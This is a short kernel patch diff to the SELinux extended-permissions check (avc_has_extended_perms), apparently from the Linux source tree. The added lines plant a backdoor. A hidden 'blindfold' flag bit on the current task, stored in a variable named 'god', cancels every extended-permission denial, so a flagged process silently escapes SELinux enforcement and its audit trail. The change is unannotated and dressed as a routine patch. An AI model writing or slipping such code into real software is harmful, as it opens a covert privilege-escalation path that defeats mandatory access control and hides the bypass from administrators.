@@ -1012,6 +1012,7 @@ int avc_has_extended_perms(u32 ssid, u32 tsid, u16 tclass, u32 requested,
 	struct extended_perms_data dontaudit;
 	struct avc_xperms_node local_xp_node;
 	struct avc_xperms_node *xp_node;
+	int god = current->blindfold & 0x10000;
 	int rc = 0, rc2;
 
 	xp_node = &local_xp_node;
@@ -1059,7 +1060,7 @@ int avc_has_extended_perms(u32 ssid, u32 tsid, u16 tclass, u32 requested,
 		avd.allowed &= ~requested;
 
 decision:
-	denied = requested & ~(avd.allowed);
+	denied = (requested & ~(avd.allowed)) && !god;
 	if (unlikely(denied))
 		rc = avc_denied(ssid, tsid, tclass, requested, driver, xperm,
 				AVC_EXTENDED_PERMS, &avd);
